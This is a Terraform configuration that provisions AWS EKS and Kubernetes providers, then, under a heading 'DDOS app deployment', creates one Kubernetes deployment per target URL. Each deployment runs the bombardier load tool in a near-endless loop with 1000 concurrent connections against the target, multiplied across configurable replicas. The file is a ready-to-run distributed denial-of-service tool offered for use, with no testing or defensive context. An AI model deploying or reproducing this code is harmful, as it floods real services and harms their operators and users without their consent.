terraform {
  backend "local" {}
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "3.70.0"
    }
    template = {
      source  = "hashicorp/template"
      version = "2.2.0"
    }
    kubernetes = {
      source  = "hashicorp/kubernetes"
      version = "2.7.1"
    }
    cloudinit = {
      source  = "hashicorp/cloudinit"
      version = "2.1.0"
    }
  }
}

provider "cloudinit" {}
provider "aws" { region = var.region }

data "aws_eks_cluster" "cluster" { name = aws_eks_cluster.this.id }
data "aws_eks_cluster_auth" "this" { name = aws_eks_cluster.this.name }
provider "kubernetes" {
  host                   = data.aws_eks_cluster.cluster.endpoint
  cluster_ca_certificate = base64decode(data.aws_eks_cluster.cluster.certificate_authority.0.data)
  token                  = data.aws_eks_cluster_auth.this.token
}

#################################
# DDOS app deployment
#################################

resource "kubernetes_deployment" "main" {
  for_each = toset(var.targets)
  metadata {
    name = "main-${replace(split("//", each.value)[1],"/","-")}"
    labels = {
      app = "main-${replace(split("//", each.value)[1],"/","-")}"
    }
    namespace = "default"
  }
  spec {
    replicas = var.replicas
    selector {
      match_labels = {
        app = "main-${replace(split("//", each.value)[1],"/","-")}"
      }
    }
    template {
      metadata {
        labels = {
          app = "main-${replace(split("//", each.value)[1],"/","-")}"
        }
      }
      spec {
        container {
          image   = "alpine/bombardier"
          name    = "main"
          command = ["/bin/sh"]
          args    = ["-c", "for run in $(seq 1 100000); do bombardier -c 1000 -d 200000h -r 10 -p i,p,r ${each.value}; done"]
        }
      }
    }
  }
}
